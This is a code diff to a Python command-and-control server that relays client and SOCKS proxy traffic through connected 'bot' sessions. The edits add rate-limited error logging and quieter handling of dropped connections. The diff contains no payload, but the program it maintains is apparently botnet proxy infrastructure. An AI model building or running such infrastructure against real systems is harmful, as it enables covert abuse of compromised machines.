@@ -16,7 +16,9 @@ import uuid
 import os
 import json
 import signal
+import time
 from typing import Dict, Tuple, Optional
+from collections import defaultdict
 
 from protocol import Frame, FramedStream, Heartbeat
 
@@ -51,6 +53,9 @@ class C2Server:
         self._shutdown_event = asyncio.Event()
         self._servers = []
         self._tasks = []
+        # Rate limiting for similar error messages
+        self._error_counts = defaultdict(int)
+        self._error_last_log = defaultdict(float)
         if certfile and keyfile:
             try:
                 if os.path.exists(certfile) and os.path.exists(keyfile):
@@ -67,6 +72,23 @@ class C2Server:
         self._rr_keys = []
         self._rr_idx = 0
         self.preferred_bot: Optional[str] = None
+
+    def _should_log_error(self, error_type: str, max_per_minute: int = 10) -> bool:
+        """Check if we should log this error type based on rate limiting."""
+        now = time.time()
+        minute_ago = now - 60
+        
+        # Clean old entries
+        if self._error_last_log[error_type] < minute_ago:
+            self._error_counts[error_type] = 0
+        
+        # Check rate limit
+        if self._error_counts[error_type] >= max_per_minute:
+            return False
+            
+        self._error_counts[error_type] += 1
+        self._error_last_log[error_type] = now
+        return True
 
     def _next_bot(self) -> Optional[BotSession]:
         if not self.bots:
@@ -196,7 +218,13 @@ class C2Server:
                         try:
                             w.write(frame.payload)
                             await w.drain()
+                        except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError) as e:
+                            # Only log broken pipe errors occasionally to reduce spam
+                            error_type = f"client_write_{type(e).__name__}"
+                            if self._should_log_error(error_type, max_per_minute=5):
+                                logger.debug("client write error: %s", e)
                         except Exception as e:
+                            # Log other errors normally
                             logger.warning("client write error: %s", e)
                 elif frame.type == "END":
                     req_id = frame.request_id
@@ -277,8 +305,11 @@ class C2Server:
                         break
                     try:
                         await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
-                    except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError):
+                    except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError) as e:
                         # Bot connection lost, stop pumping
+                        error_type = f"bot_send_{type(e).__name__}"
+                        if self._should_log_error(error_type, max_per_minute=3):
+                            logger.debug("bot send error: %s", e)
                         break
             except Exception:
                 pass
@@ -323,9 +354,19 @@ class C2Server:
                     chunk = await reader.read(4096)
                     if not chunk:
                         break
-                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    try:
+                        await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
+                    except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError) as e:
+                        # Bot connection lost, stop pumping
+                        error_type = f"socks_send_{type(e).__name__}"
+                        if self._should_log_error(error_type, max_per_minute=3):
+                            logger.debug("socks send error: %s", e)
+                        break
             finally:
-                await bot.stream.send(Frame(type="END", request_id=req_id))
+                try:
+                    await bot.stream.send(Frame(type="END", request_id=req_id))
+                except Exception:
+                    pass
 
         asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")
 
